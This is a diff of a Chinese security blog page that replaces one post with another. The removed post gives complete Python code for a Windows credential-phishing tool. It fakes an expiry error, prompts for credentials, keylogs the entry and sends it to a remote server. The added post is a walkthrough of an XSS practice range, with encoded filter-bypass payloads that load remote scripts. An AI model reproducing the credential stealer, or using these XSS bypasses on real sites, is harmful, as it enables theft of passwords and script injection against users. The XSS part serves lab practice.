@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>windows凭证钓鱼 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="windows凭证钓鱼 | 九世的博客">
+  <title>xss bypass 进阶 | 九世的博客</title>
+  <meta name="keywords" content=" bypass ">
+  <meta name="description" content="xss bypass 进阶 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1410,9 +1410,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-windows凭证钓鱼" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-xss-bypass-进阶" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">windows凭证钓鱼</h1>
+        <h1 class="article-title">xss bypass 进阶</h1>
     
     <div class="article-meta">
         
@@ -1421,14 +1421,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color2">bypass</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-08-13 17:55:32">2019-08-13 17:45</time>
+        创建时间:<time class="date" title="更新时间: 2020-06-08 23:48:26">2020-06-08 21:31</time>
         
     </div>
     <div class="article-meta">
@@ -1450,7 +1450,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一题"><span class="toc-text">第一题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二题"><span class="toc-text">第二题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三题"><span class="toc-text">第三题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第四题"><span class="toc-text">第四题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第七题"><span class="toc-text">第七题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题外话"><span class="toc-text">题外话</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1465,72 +1465,38 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在群里看见WBG老哥通过powershell来记录，windows凭证登录的用户名的和密码<br>当时就我凑了，看完gif后自己也想写一个<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565699852904&amp;di=73af6fe7fb5650178fcc87f189f65330&amp;imgtype=0&amp;src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2Ff%2F5744232793d1a.jpg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565699852904&amp;di=73af6fe7fb5650178fcc87f189f65330&amp;imgtype=0&amp;src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2Ff%2F5744232793d1a.jpg"></p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>需要用到的库：</p>
-<pre><code>pyHook
-pywin32
-pycom
-requests
-</code></pre><p>仓库地址：<br><a href="https://github.com/422926799/python/tree/master/windows%E5%87%AD%E8%AF%81%E6%8D%95%E8%8E%B7" target="_blank" rel="noopener">python/windows凭证捕获 at master · 422926799/python · GitHub</a></p>
-<p>思路：</p>
-<pre><code>弹出一个MSgbox提升用户凭证过期
-执行powershell命令要求输入凭证
-寻找到该窗体
-记录下键盘的输入
-发送到远程服务器
-</code></pre><p>代码：</p>
-<pre><code class="python">#@author:
-#@file:main.py
-import pythoncom, pyHook
-import pyHook
-from ctypes import *
-import requests
-import win32api
-import win32con
-import os
-import threading
-
-win32api.MessageBox(0,&quot;Windows凭证失效&quot;,&quot;Windows Error&quot;,win32con.MB_ICONERROR)
-os.popen(r&#39;&#39;&#39;powershell iex &quot;$creds = $host.ui.PromptForCredential(\&quot;Login Required\&quot;,\&quot;Enter username and password.\&quot;, \&quot;$env:username\&quot;,\&quot;NewBiosUserName\&quot;);&quot;&#39;&#39;&#39;)
-print(&#39;[+] windows凭证捕获&#39;)
-passwd=[]
-def OnKeyboardEvent(event):
-    windowTitle=create_string_buffer(512)
-    windll.user32.GetWindowTextA(event.Window,byref(windowTitle),512) #从窗体中获得窗体的title
-    windowname=windowTitle.value.decode(&#39;gbk&#39;)
-    if &#39;Login Required&#39;==windowname: #判断是否为登录窗体
-        key=chr(event.Ascii)
-        if key!=&#39;&#39;:
-            print(&#39;{}&#39;.format(key),end=&#39;&#39;)
-            passwd.append(key)
-        elif len(key)==0:
-            print(&#39;\n&#39;)
-# return True to pass the event to other handlers
-    return True
-
-def run():
-    # create a hook manager
-    hm = pyHook.HookManager()
-    # watch for all mouse events
-    hm.KeyDown = OnKeyboardEvent #设置事件过滤
-    # set the hook
-    hm.HookKeyboard()
-    # wait forever
-    print(&#39;键盘输入:&#39;)
-    pythoncom.PumpMessages()
-
-if __name__ == &#39;__main__&#39;:
-    t=threading.Thread(target=run,args=())
-    t.setDaemon(True)
-    t.start()
-    t.join(10)
-    for j in passwd:
-        if str(j)==&#39;\x00&#39; or str(j)==&#39;\t&#39;:
-            pass
-        else:
-            rqt=requests.get(url=&#39;http://127.0.0.1/jieshou.php?password={}&#39;.format(str(j)),headers={&#39;user-agent&#39;:&#39;nb&#39;}) #发送到远程服务器
+        <p>在知识星球见到一位老哥的xss靶场，感觉不错做了后学到不少东西。由于懒惰，导致现在才写。<br>靶场一共有八题，只做了七题</p>
+<p>靶场地址：<a href="http://xcao.vip" target="_blank" rel="noopener">http://xcao.vip</a><br>题目最终要求是加载：<a href="http://xcao.vip/xss/alert.js" target="_blank" rel="noopener">http://xcao.vip/xss/alert.js</a></p>
+<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p><a href="http://xcao.vip/test/xss1.php" target="_blank" rel="noopener">独孤九剑-第一式</a><br>过滤了<code>=()</code>,输入点在标签里</p>
+<p><img src="https://s1.ax1x.com/2020/06/08/thMJ6x.png" alt=""></p>
+<p>利用<code>&lt;</code>闭合标签，使用document.write配合unicode编码写js到当前页面<br>payload:</p>
+<pre><code>http://xcao.vip/test/xss1.php?data=1%22%3E%3Cscript%3Edocument.write`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0078\u0063\u0061\u006f\u002e\u0076\u0069\u0070\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e`%3C/script%3E%3C!--)
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/08/thMo3n.png" alt=""></p>
+<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><a href="http://xcao.vip/test/xss2.php" target="_blank" rel="noopener">独孤九剑-第二式</a><br>过滤了<code>=().</code>输入点在标签里<br><img src="https://s1.ax1x.com/2020/06/08/thQuvt.png" alt=""></p>
+<p>利用<code>&lt;</code>闭合标签，使用document.write配合top函数写js到当前页面<br>payload:</p>
+<pre><code>http://xcao.vip/test/xss2.php?data=1%22%3E%3Cscript%3Etop[%22document%22][%22write%22]`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0078\u0063\u0061\u006f\u002e\u0076\u0069\u0070\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e`%3C/script%3E%20%3C!--
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/08/thQN2n.png" alt=""></p>
+<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p><a href="http://xcao.vip/test/xss3.php" target="_blank" rel="noopener">独孤九剑-第三式</a><br>过滤了<code>().&amp;#</code>这意味着没发使用unicode编码了，但是开放了=<br><img src="https://s1.ax1x.com/2020/06/08/thQ5VO.png" alt=""></p>
+<p>将js放到某个公网ip上面，然后将ip转换成十进制即可<br>利用php的302跳转</p>
+<pre><code class="php">&lt;?php
+header(&quot;Location: http://suo.im/5U1ERv&quot;);
+?&gt;
 </code></pre>
-<p>效果图<br><img src="https://camo.githubusercontent.com/4bae8e67d066491583907c9a13c870955120e9e2/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f31332f6d70686575642e676966" alt="68747470733a2f2f73322e617831782e636f6d2f323031392f30382f31332f6d70686575642e676966"></p>
+<p>payload：</p>
+<pre><code>http://xcao.vip/test/xss3.php?data=1%22%3E%3Cscript%20src=%22http://2130706433%22%3E%3C/script%3E%3C!--
+</code></pre><p>这里的<code>2130706433</code>是10进制编码后的<code>127.0.0.1</code><br><img src="https://s1.ax1x.com/2020/06/08/thl8L6.png" alt=""></p>
+<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p><a href="http://xcao.vip/test/xss4.php" target="_blank" rel="noopener">独孤九剑-第四式</a><br>过滤了<code>=().&amp;#\</code><br><img src="https://s1.ax1x.com/2020/06/08/th190K.png" alt=""></p>
+<p>利用iframe标签然后配合base64编码的js加载</p>
+<pre><code>http://xcao.vip/test/xss4.php?data=1%22%3E%3Cscript%3Etop[%22document%22][%22write%22]`${top[%22String%22][%22fromCharCode%22]`61`%2b%22data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcz48L3NjcmlwdD4=%3E111%3C/iframe%3E%22}%20%3Ciframe%20src`%3C/script%3E%3C!--
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/08/th1Z6I.png" alt=""></p>
+<p>后面的第五题和第六题都可以用这个payload就不另想了</p>
+<h2 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h2><p><a href="http://xcao.vip/test/xss7.php" target="_blank" rel="noopener">独孤九剑-第七式</a><br>过滤了<code>=().&amp;#\%&lt;&gt;</code>，输入点在js里</p>
+<p><img src="https://s1.ax1x.com/2020/06/08/th3UxA.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/06/08/th3eC4.png" alt=""></p>
+<p>将=,&lt;,&gt;进行ascii编码，payload稍作修改即可</p>
+<pre><code>http://xcao.vip/test/xss7.php?data=%22%22;top[%22document%22][%22write%22]`${top[%22String%22][%22fromCharCode%22]`60`%2b%22iframe%20src%22%2btop[%22String%22][%22fromCharCode%22]`61`%2b%22data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcz48L3NjcmlwdD4=%22%2btop[%22String%22][%22fromCharCode%22]`62`}`
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/08/th35ZV.png" alt=""></p>
+<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>第八题过滤的太变态暂时没思路<br><img src="https://s1.ax1x.com/2020/06/08/thG900.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1540,12 +1506,12 @@ if __name__ == &#39;__main__&#39;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>windows凭证钓鱼</p>
+    <p><span class="copy-title">文章标题:</span>xss bypass 进阶</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-13, 17:45:23</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-13, 17:55:32</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/1441cb97.html" title="windows凭证钓鱼">http://422926799.github.io/posts/1441cb97.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-06-08, 21:31:14</p>
+    <p><span class="copy-title">最后更新:</span>2020-06-08, 23:48:26</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/6bcf9b8f.html" title="xss bypass 进阶">http://422926799.github.io/posts/6bcf9b8f.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
